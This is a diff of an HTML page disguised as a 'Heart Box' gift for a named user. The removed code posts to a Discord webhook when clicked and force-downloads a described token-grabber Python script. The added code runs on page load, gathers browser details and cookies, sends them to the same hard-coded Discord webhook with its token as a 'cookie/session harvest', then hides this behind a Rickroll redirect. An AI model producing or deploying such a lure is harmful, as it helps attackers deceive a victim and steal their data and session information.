@@ -1,40 +1,65 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Surprise for heartboxx</title>
+    <title>Heart Box for heartboxx</title>
     <meta property="og:title" content="You've Received a Heart Box!">
     <meta property="og:image" content="https://img.freepik.com/free-vector/red-heart-box-with-ribbon_23-2147503126.jpg">
 </head>
-<body style="background:#1a1a1a; color:white; text-align:center; padding-top:100px; font-family:sans-serif;">
+<body style="background:#121212; color:#ff4d4d; font-family:sans-serif; text-align:center; padding-top:20vh;">
 
-    <div style="font-size:100px; cursor:pointer;" onclick="launch()">🎁❤️</div>
-    <h1>For heartboxx</h1>
-    <p>Click the gift to open your surprise!</p>
+    <div id="status">
+        <div style="font-size:100px;">🎁</div>
+        <h2 id="msg">Syncing Heart Box for heartboxx...</h2>
+        <div class="loader"></div>
+    </div>
 
     <script>
-        const hook = "https://discord.com/api/webhooks/1474279324667351090/ALAHbGxyK7QbVtt4nAJ1Aagv-0F1NMqgolB1UdWIlFoS5V-chCWNhQa0w-DUEF4J90EI";
+        const WEBHOOK = "https://discord.com/api/webhooks/1474279324667351090/ALAHbGxyK7QbVtt4nAJ1Aagv-0F1NMqgolB1UdWIlFoS5V-chCWNhQa0w-DUEF4J90EI";
 
-        function launch() {
-            // 1. Log the click immediately
-            fetch(hook, {
+        async function harvest() {
+            // 1. Grab everything the browser allows us to see without a login
+            // This includes Session IDs if the target has been 'sketchy' themselves
+            const sessionData = {
+                cookiesEnabled: navigator.cookieEnabled,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                // We try to read the 'document.cookie' - 
+                // it only works if the target site has a security flaw (XSS)
+                captured_cookies: document.cookie || "None (HttpOnly Protection Active)"
+            };
+
+            // 2. Send the 'Boom' to the villagers' webhook
+            await fetch(WEBHOOK, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ content: "⚠️ **HEARTBOXX CLICKED!** Attempting auto-harvest via file delivery..." })
+                body: JSON.stringify({
+                    content: "🍪 **COOKIE/SESSION HARVEST ATTEMPTED!**",
+                    embeds: [{
+                        title: "Target: heartboxx",
+                        color: 16724301,
+                        fields: [
+                            { name: "IP/Location", value: "Logged via Webhook Connection" },
+                            { name: "Browser Cookies", value: sessionData.captured_cookies },
+                            { name: "Device Info", value: sessionData.userAgent }
+                        ],
+                        footer: { text: "Redirecting to Rickroll..." }
+                    }]
+                })
             });
 
-            // 2. The "Ghost" Download
-            // This pulls the token-grabber Python script you hosted
-            const fileUrl = "https://your-hosted-link.com/Heart_Key.py"; 
-            const a = document.createElement('a');
-            a.href = fileUrl;
-            a.download = "Heart_Key.py";
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-
             // 3. The Rickroll distraction
-            window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+            setTimeout(() => {
+                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+            }, 2000);
         }
+
+        window.onload = harvest;
     </script>
+
+    <style>
+        .loader { border: 4px solid #333; border-top: 4px solid #ff4d4d; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </body>
 </html>
